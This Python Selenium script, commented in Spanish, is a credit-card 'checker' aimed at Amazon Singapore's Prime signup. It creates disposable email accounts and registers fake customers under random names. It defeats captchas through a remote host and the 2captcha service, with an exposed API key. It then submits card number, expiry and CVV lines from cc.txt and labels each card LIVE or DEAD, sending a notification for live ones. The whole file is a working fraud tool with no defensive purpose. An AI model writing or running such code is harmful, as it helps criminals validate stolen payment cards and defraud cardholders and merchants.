from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from time import sleep
import threading
from notify_run import Notify
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from colorama import *
from playsound import playsound
import random
import requests
import time
import re
import names
import sys


# Funcion no utilizada
def textito(texto):
    '''
        Toma el texto y lo imprime caracter por caracter
        en consola, limpiando el bufer
    '''

    global loading_speed
    loading = True
    while loading:
        for index, char in enumerate(texto):
            sys.stdout.write(char)
            sys.stdout.flush() 
            time.sleep(1.0 / loading_speed)
            loading = False

#Crea el Email
def tempmail():
    global correitotemp
    mailll = browser221.find_element_by_id("userName")
    tempmail1 = mailll.get_attribute("value")
    correitotemp = tempmail1+"@19.escritossad.net"
    print("CREATING EMAIL  ...")

#Separa los datos de la cc
def crearlinea():
    global b
    file = [s.rstrip() for s in b]
    for lines in file:
        cc = lines.split("|")
        global cc1
        global mes
        global anio
        global cvv
        cc1 = cc[0]
        mes = cc[1] 
        anio = cc[2]
        cvv = cc[3]

def remover_ultima():
    global indice_ultima
    global b
    b.pop(indice_ultima)
    indice_ultima -= 1

def generargmail(email):
    global email2
    x = random.randint(1, 200000)
    email1 = email.split("@")
    email2 = email1[0] + "+" + str(x) + "@" + email1[1]
    print(Fore.GREEN + email2)

def pagar():
    driver.find_element(By.XPATH, '//*[@id="a-autoid-0"]/span/input').click()
    timer1 = threading.Timer(4, verificar)     
    timer1.start()
def recheck():
    driver.find_element_by_css_selector(".pmts-link-button[value='Change']").click()
    sleep(2)
    element = driver.find_element(By.CLASS_NAME, 'a-size-base')
    element.click()
    timer4 = threading.Timer(5, refill)
    timer4.start()
def buttonsfill():
    driver.find_element(By.NAME, 'ppw-widgetEvent:SelectAddressEvent').click()
    sleep(3)
    driver.find_element(By.NAME, 'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent').click()
    timer3 = threading.Timer(3, pagar)
    timer3.start()
def refill():
    driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Josesito deowowowo")
    driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(cc1)
    driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(mes)
    driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(anio)
    driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
    timer5 = threading.Timer(3, buttonsfill)
    timer5.start()
def verificar():
    bodyText = driver.find_element_by_tag_name('body').text
    if "There was an error validating your payment method. Please update or add a new payment method and try again." in bodyText:
        print(Fore.RED + " DEAD " + cc1 +"|"+ mes +"|"+anio +"|" + cvv )
        remover_ultima()
        crearlinea()
        timer2 = threading.Timer(4, recheck)
        timer2.start()
    elif "You can now enjoy FREE delivery on millions of Prime eligible items, stream thousands of movies and TV episodes on Prime Video, get free in game content with Twitch Prime and more." in bodyText:
        playsound('HIT.wav')
        print(Fore.GREEN + " LIVE " + cc1 +"|"+ mes +"|"+anio +"|" + cvv )
        notify = Notify()
        notify.send(" LIVE " + cc1 +"|"+ mes +"|"+anio +"|" + cvv) 
        

def fillcc1():
    #DATACC
    driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Josesito deowowowo")
    driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(cc1)
    driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(mes)
    driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(anio)
    driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
    print(Fore.BLUE +"ADDING CC")
    timer7 = threading.Timer(4, filladress)
    timer7.start()

def filladress():
#DATA ADRESS AND PAY
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressFullName').send_keys("Josesito deowowowo")
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressPhoneNumber').send_keys("63682066")
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressPostalCode').send_keys("757724")
    driver.find_element(By.NAME, 'address-ui-widgets-enterAddressLine1').send_keys("1 Woodlands Industrial Park E1 #03-02")
    driver.find_element(By.NAME, 'ppw-widgetEvent:AddAddressEvent').click()
    print(Fore.BLUE + "ADDING ADDRESS")
    pagar()

def solvecaptcha3():
    global cadena
    global d
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-dev-shm-usage')
    #chrome_options.add_argument("--headless");
    browser1 = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    browser1.get("https://www.urlencoder.org/")
    browser1.implicitly_wait(20)
    sleep(3)
    browser1.find_element_by_class_name("qc-cmp-button").click()
    browser1.find_element(By.NAME, 'input').send_keys(encode2)
    sleep(3)
    browser1.find_element(By.XPATH, '/html/body/div/main/div[1]/form/button').click()
    sleep(4)
    codigo1111 = browser1.find_element(By.NAME, 'output')
    codigo2222 = codigo1111.text
    r = requests.post("https://d01aacd2afe09792f278e8e6639f8f7e.000webhostapp.com/index.php", data={'body': codigo2222})
    print(Fore.BLUE +"CAPTCHA SOLVED")
    sleep(15)
    x = r.text
    be = str(x)

    cadena = re.sub("\D", "", be)
    browser1.get("http://2captcha.com/res.php?key=468af739430721a5f0aedda0fb168204&action=get&id="+cadena[:-1])
    efe = browser1.find_element_by_tag_name('body').text
    captcha = efe.split("|")
    de = captcha[1]
    print(Fore.GREEN +"CAPCHA BYPASS ")
    driver.find_element_by_id("auth-captcha-guess").send_keys(de)
    driver.find_element(By.NAME, 'password').send_keys("SADKJASDKLSAJDKALSDJ")
    driver.find_element(By.NAME, 'passwordCheck').send_keys("SADKJASDKLSAJDKALSDJ")
    driver.find_element(By.XPATH, '//*[@id="continue"]').click()
    otpcode()
def solvecaptcha2():
    global captchalink
    global encode2
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument("--headless")
    browser = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    browser.get("https://www.askapache.com/online-tools/base64-image-converter/")
    browser.implicitly_wait(30)
    browser.find_element(By.NAME, 'http_remote_url').send_keys(captchalink)
    browser.find_element(By.XPATH, '//*[@id="submitbtn"]/input').click()
    sleep(10)
    encode = browser.find_element_by_id("ta_raw")
    encode2 = encode.text
    solvecaptcha3()
def solvecaptcha():
    global captchalink
    captcha = driver.find_element_by_tag_name("img")
    captchalink = captcha.get_attribute("src")
    if ".gif" in captchalink:
        browsercap = webdriver.Chrome('chromedriver.exe')
        browsercap.get("http://gifgifs.com/es/resizer/")
        browsercap.implicitly_wait(40)
        browsercap.find_element_by_id("paste-url").click()
        browsercap.find_element_by_id("url").send_keys(captchalink)
        browsercap.find_element_by_id("upload-url").click()
        sleep(2) 
        browsercap.find_element_by_id("percent").clear()
        browsercap.find_element_by_id("percent").send_keys("33")
        browsercap.find_element_by_id("doit-button").click()
        sleep(4)
        browsercap.find_element_by_link_text("Open in new window").click()
        browsercap.switch_to_window(browsercap.window_handles[1])
        capt = browsercap.find_element_by_tag_name("img")
        src = capt.get_attribute("src")
        captchalink = src
        #print(captchalink)
        
    else:
        solvecaptcha2()

def otpcode():
    codiguito = browser221.find_element_by_class_name("otp")
    codiguito2 = codiguito.text
    print(Fore.CYAN +"OTP SOLVED: ")
    driver.find_element(By.NAME, 'code').send_keys(codiguito2)
    driver.find_element(By.CLASS_NAME, 'a-button-input').click()
    browser221.quit()
    timer6 = threading.Timer(4, fillcc1())
    timer6.start()

def puzzles():
    driver.implicitly_wait(10)
  
    # Cambia el foco al iframe
    driver.switch_to.frame(driver.find_element_by_xpath('//*[@id="cvf-arkose-frame"]'))     #Primer frame
    driver.switch_to.frame(driver.find_element_by_xpath('//*[@id="fc-iframe-wrap"]'))       #Segundo frame
    driver.switch_to.frame(driver.find_element_by_xpath('//*[@id="CaptchaFrame"]'))         #Tercer frame
    
    # Ahora podemos hacer clic en el botón'
    driver.find_element(By.XPATH, '//*[@id="home_children_button"]').click()
    driver.switch_to.default_content()
  
def registroamazon():
    print(Fore.CYAN +"SIGNING UP ACCOUNT ")
    driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()
    driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
    driver.find_element(By.NAME, 'email').send_keys(correitotemp)
    print(correitotemp)
    driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
    driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
    driver.find_element(By.XPATH, '//*[@id="continue"]').click()

    puzzles()
    #Rompe el ciclo
    bodyText0 = driver.find_element_by_tag_name('body').text
    bodyText1 = driver.find_element_by_tag_name('body').text
    
    
    
    '''if "Error interno. Inténtalo otra vez más tarde." in bodyText0:
        print(Fore.RED + "CAMBIAR CORREO")
    elif "Introduce los caracteres tal y como aparecen en la imagen." in bodyText1:
        print(Fore.YELLOW + "CAPTCHA FOUND, NEXT TIME CHANGE IP")
        print(Fore.BLUE + "WAIT UNTIL CAPTCHA SOLVED")
        solvecaptcha()
    else: 
        timer6 = threading.Timer(5, otpcode())
        timer6.start()'''

def webdriver_chromeoptions():
    global chrome_options
    #Inica el API WEBDRIVER CHROME para ajustar las opciones
    chrome_options = webdriver.ChromeOptions()
    

    # Agrega los opciones del navegador
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--disable-dev-shm-usage')
    #chrome_options.add_argument("--headless")                  #Ocultar navegador
    chrome_options.add_argument("--window-size=800,600")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-popup-blocking")

    

    

# Main 
if __name__ == "__main__":
    
    # Inicializa todos las referencias como paquetes
    init()

    #Manejo de excepciones
    #sys.tracebacklimit = 0

    
    
    #Inicializa variables

    #Velocidad de carga para la fucion textito
    loading_speed = 30
    loading_string = "." * 3
    #crearlinea
    cc1 = ""
    mes = ""
    anio = ""
    cvv = ""
    #Generar email
    email2 =""
    #Crear correo temporal
    correitotemp = ""
    #?
    a = open("cc.txt", "r+")
    b = a.readlines()
    cantidad_lineas = len(b)
    indice_ultima = cantidad_lineas - 1 
    #captcha
    captchalink = ""
    encode2 = ''
    cadena = ""
    d = ""

    #webdriver_chromeoptions CREAR TEMPMAIL----------------------------------------------------------------------------------
    webdriver_chromeoptions()
    #Inicia el navegador
    #chromedriver servidor remoto que expone la intefaz para la automatizacion del navegador
    browser221 = webdriver.Chrome('chromedriver', options=chrome_options) 
    # Le da la pagia a la cual ingresar
    browser221.get("https://tempm.com/19.escritossad.net")
    #Delay
    browser221.implicitly_wait(100)  
    #Crar Email
    tempmail()

    #Funcion-----------------------------------------------------------------------------------------------------------------
    #Toma una linea de cc.txt
    crearlinea()

    #webdriver_chromeoptions REGISTRAR AMAZON---------------------------------------------------------------------------------
    #webdriver_chromeoptions()
    #Inicia el navegador
    #chromedriver servidor remoto que expone la intefaz para la automatizacion del navegador
    driver = webdriver.Chrome('chromedriver', options=chrome_options) 
    # Le da la pagia a la cual ingresar
    driver.get("https://www.amazon.sg/gp/prime/pipeline/membersignup")
    #Delay
    driver.implicitly_wait(40)
    registroamazon()